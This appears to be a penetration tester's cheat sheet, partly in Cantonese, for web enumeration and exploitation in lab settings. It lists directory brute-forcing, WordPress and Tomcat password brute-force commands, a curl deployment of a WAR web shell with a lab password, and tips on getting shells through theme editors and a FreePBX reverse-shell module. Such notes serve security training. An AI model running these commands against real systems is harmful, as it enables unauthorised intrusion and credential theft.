# HTTP Enumeration
- Nikto
```
nikto -h $ip
nikto -h $ip -p 8080
```
## Directory Brute-forcing 
- Gobuster
```
gobuster dir -u http://10.3.3.14/dashboard/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt
```
We can add `-k` to skip SSL certificate verification.
We can tweak gobuster to show us responses with status codes other than 200.
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s "204,301,302,307,401,403" -u bart.htb
```
有可能咩都搵唔到,因為可能比人filter咗。佢user-agent會寫gobuster,好易比人發現。

- wfuzz
```
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://192.168.71.43

wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -z list,txt-php-html -u http://192.168.71.43/october/FUZZ.FUZ2Z --hc 404,403 -t 100

wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test

wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ

wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"

wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ
```
- Recurse level 3

```
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ
```
- dirb
```
dirb [URL target host]
dirb [URL target host] [wordlist]
```
We can add `-W` to continue scanning past the warning messages.
- Nmap Check the server methods
```
nmap --script http-methods --script-args http-methods.url-path='/test' $ip
```

## cgi-bin
```
gobuster dir -u 192.168.26.46/cgi-bin  -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt 
```

## WordPress

- Get shell : `Appearance > Editor. From this page you can select and edit the desired theme file.`

- Credentials are stored in **wp-config.php**.
- Remember to check **Plugins**.
- Update wpscan
```
wpscan --update
```
- Enumerating WordPress users
```
wpscan --url $ip --enumerate u
```
- Enumerating plugins
```
wpscan --url http://10.3.3.34:9999 -e p

wpscan --url http://192.168.26.46/blog -e ap

wpscan --url $ip --enumerate ap --plugins-detection aggressive
```
- Password Brute-forcing

```
wpscan --url http://$IP --passwords /usr/share/wordlists/rockyou.txt --usernames notch -t 100 --password-attack wp-login

wpscan --url http://$IP --passwords /usr/share/wordlists/rockyou.txt -U users.txt
```

- Proxy
```
wpscan --url $ip/blog --proxy $ip:3129
```
- HTTPS

    `--disable-tls-checks`

## Tomcat manager
- Password brute-forcing
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html
```
- Credentials are stored in `tomcat-users.xml`.
    - Location : `Ubuntu 
    (/usr/share/tomcat9/etc/tomcat-users.xml)`

- 留意有無struts2
- 如果有credentials, 但話只有server部機個browser可以login, 就deploy war file using curl
```
curl -u 'tomcat':'$3cureP4s5w0rd123!' -T cmd.war http://10.10.10.194:8080/manager/text/deploy?path=/app
```

## Magento
> https://github.com/steverobbins/magescan
```
php magescan.phar -vvv scan:all 10.10.10.140 > output
• -vvv: increase the verbosity to level 3
• scan:all: run all scans
```

## Joomla
- we can write code into templates to get a shell
- joomscan

## FreePBX
- 如果login到做admin, 可以upload module embedder with reverse shell.

## Jenkins
> https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/

